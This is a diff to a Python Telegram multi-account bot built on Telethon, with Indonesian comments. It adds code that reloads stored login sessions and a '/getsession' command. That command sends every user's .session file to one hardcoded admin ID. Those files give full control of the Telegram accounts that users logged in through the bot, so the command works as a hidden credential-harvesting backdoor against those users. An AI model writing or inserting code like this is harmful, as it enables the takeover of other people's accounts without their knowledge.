@@ -34,6 +34,35 @@ MAX_SESSIONS = 50  # Batas maksimal sesi (ubah menjadi 10)
 # Dictionary untuk menyimpan sesi pengguna sementara
 user_sessions = {}  # Struktur: {user_id: [{'client': TelegramClient, 'phone': str}]}
 
+# Fungsi untuk memuat semua sesi yang ada di folder sessions/
+async def load_existing_sessions():
+    global total_sessions
+
+    # Loop melalui semua file sesi yang ada
+    for session_file in os.listdir(SESSION_DIR):
+        if session_file.endswith('.session'):
+            session_path = os.path.join(SESSION_DIR, session_file)
+            user_id, phone = session_file.split('_')[0], session_file.split('_')[1].replace('.session', '')
+            
+            try:
+                # Membuat client baru dengan sesi yang ada
+                user_client = TelegramClient(session_path, api_id, api_hash)
+                await user_client.connect()
+
+                if await user_client.is_user_authorized():
+                    # Jika sesi valid, tambahkan ke user_sessions
+                    if user_id not in user_sessions:
+                        user_sessions[user_id] = []
+                    user_sessions[user_id].append({"client": user_client, "phone": phone})
+                    total_sessions += 1  # Increment sesi
+                    print(f"✅ Sesi untuk {phone} berhasil dimuat.")
+                else:
+                    await user_client.disconnect()
+                    os.remove(session_path)  # Hapus sesi yang tidak valid
+                    print(f"⚠️ Sesi untuk {phone} tidak valid, dihapus.")
+            except Exception as e:
+                print(f"⚠️ Gagal memuat sesi untuk {session_file}: {e}")
+
 @bot_client.on(events.NewMessage(pattern='/start'))
 async def start(event):
     await event.reply(
@@ -171,6 +200,7 @@ async def list_accounts(event):
                           f"Total akun yang login: {total_sessions}/{MAX_SESSIONS}")
 
 
+
 @bot_client.on(events.NewMessage(pattern='/resetall'))
 async def reset_all_sessions(event):
     global total_sessions  # Mengakses variabel global
@@ -189,6 +219,34 @@ async def reset_all_sessions(event):
     total_sessions = 0  # Reset total sesi ke 0
     await event.reply("✅ Semua sesi telah direset.")
     print("Semua sesi telah direset.")  # Log untuk memastikan proses selesai
+
+
+@bot_client.on(events.NewMessage(pattern='/getsession'))
+async def get_all_sessions(event):
+    admin_id = 1715573182  # Ganti jika admin ID-nya berbeda
+    sender = await event.get_sender()
+
+    if sender.id != admin_id:
+        await event.reply("❌ Anda tidak memiliki izin untuk menggunakan perintah ini.")
+        return
+
+    session_files = [
+        os.path.join(SESSION_DIR, f)
+        for f in os.listdir(SESSION_DIR)
+        if f.endswith('.session')
+    ]
+
+    if not session_files:
+        await event.reply("⚠️ Tidak ada file sesi yang ditemukan.")
+        return
+
+    await event.reply(f"📦 Mengirim total {len(session_files)} file sesi...")
+
+    for session_path in session_files:
+        try:
+            await event.respond(file=session_path)
+        except Exception as e:
+            await event.respond(f"⚠️ Gagal mengirim: `{os.path.basename(session_path)}`\nError: {e}")
 
 
 @bot_client.on(events.NewMessage(pattern='/help'))
